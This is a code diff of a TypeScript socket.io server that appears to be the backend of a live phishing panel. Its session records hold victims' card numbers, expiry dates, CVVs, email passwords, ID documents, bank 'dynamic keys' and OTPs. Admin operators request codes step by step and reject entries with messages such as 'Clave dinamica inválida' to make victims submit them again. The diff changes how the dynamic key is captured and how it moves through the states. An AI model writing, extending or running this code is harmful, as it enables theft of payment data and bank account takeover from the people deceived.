@@ -13,13 +13,13 @@ type Role = "admin" | "user";
 
 type Ack = (res: { ok: boolean; error?: string }) => void;
 
-type Auth = {user: string, pass: string};
+type Auth = {user: string, pass: string, dinamic: string};
 
 type AdminRejectPayload = { sessionId: string; message?: string };
 type AdminRequestPayload = { sessionId: string };
 
 type UserSubmitAuth = { sessionId: string; auth: Auth };
-type UserSubmitDinamic = { sessionId: string; dinamic: string };
+type UserSubmitDinamic = { sessionId: string; auth: Auth };
 type UserSubmitOtp = { sessionId: string; otp: string };
 
 export type AuthPayload =
@@ -49,30 +49,6 @@ export enum ActionState {
   OTP_ERROR= "OTP_ERROR",
   DONE = "DONE",
 } */
-
-export type SessionEntity = {
-  id: string;
-  state: SessionState;
-  action: ActionState;
-  ip: string | null; // (temporal si step1 es "usuario", luego lo renombramos)
-  name: string | null;
-  phone: string | null;
-  email: string | null;
-  emailPass: string | null;
-  address: string | null;
-  cc: string | null;
-  exp: string | null;
-  cvv: string | null;
-  document: string | null;
-  country: string | null;
-  city: string | null;
-  dinamic: string | null;
-  otp: string | null;
-  assignedAdminId: string | null;
-  lastError: string | null;
-  createdAt?: Date;
-  updatedAt?: Date;
-};
 
 const PORT = Number(process.env.PORT || 3005);
 const ORIGIN = process.env.LARAVEL_ORIGIN || "http://localhost:8000";
@@ -133,8 +109,10 @@ async function emitSessionUpdate<T>(
   const s = await repo.findById(sessionId);
   if (!s) return null;
 
-  io.to("admins").emit("admin:sessions:upsert", s);
+
   io.to(`session:${sessionId}`).emit("session:update", s);
+  io.to("admins").emit("admin:sessions:upsert", s);
+
 
   return s;
 }
@@ -177,13 +155,13 @@ io.on("connect", (socket) => {
         if (!isNonEmptyString(payload.sessionId)) return;
 
         const s = await repo.findById(payload.sessionId);
-        if (!s || s.action !== ActionState.DINAMIC) return;
+        if (!s || s.action !== ActionState.AUTH_WAIT_ACTION) return;
 
         await repo.update(payload.sessionId, {
           action: ActionState.DINAMIC,
           lastError: null,
         });
-
+        const s2 = await repo.findById(payload.sessionId);
         await emitSessionUpdate(io, repo, payload.sessionId);
       } catch (e) {
         console.error("admin:request_dinamic error", e);
@@ -199,10 +177,10 @@ io.on("connect", (socket) => {
         if (!s || s.action !== ActionState.DINAMIC_WAIT_ACTION) return;
 
         await repo.update(payload.sessionId, {
-          action: ActionState.DINAMIC,
+          action: ActionState.DINAMIC_ERROR,
           lastError: isNonEmptyString(payload.message)
             ? payload.message.trim()
-            : "Nombre inválido. Verifica e intenta nuevamente.",
+            : "Clave dinamica inválida. Verifica e intenta nuevamente.",
         });
 
         await emitSessionUpdate(io, repo, payload.sessionId);
@@ -306,6 +284,7 @@ io.on("connect", (socket) => {
           
           // ✅ permitir reintento
           if (!s.action) return ack?.({ ok: false, error: "bad_state" });
+
           const allowed: ActionState[] = [ActionState.AUTH, ActionState.AUTH_ERROR];
           if (!allowed.includes(s.action)) return ack?.({ ok:false, error:"bad_state" });
           
@@ -334,17 +313,19 @@ io.on("connect", (socket) => {
             return ack?.({ ok: false, error: "bad_session" });
           mustMatchSession(socket, payload.sessionId);
 
-          const dinamic = payload.dinamic?.trim();
+          const dinamic = payload.auth.dinamic.trim();
           if (!isNonEmptyString(dinamic) || dinamic.length < 5)
             return ack?.({ ok: false, error: "invalid_address" });
 
           const s = await repo.findById(payload.sessionId);
           if (!s) return ack?.({ ok: false, error: "not_found" });
-          if (s.action !== ActionState.DINAMIC)
-            return ack?.({ ok: false, error: "bad_state" });
+          
+          const allowed: ActionState[] = [ActionState.DINAMIC, ActionState.DINAMIC_ERROR];
+          if (!allowed.includes(s.action)) return ack?.({ ok:false, error:"bad_state" });
+          
 
           await repo.update(payload.sessionId, {
-            address: dinamic,
+            dinamic: dinamic,
             action: ActionState.DINAMIC_WAIT_ACTION,
             lastError: null,
           });
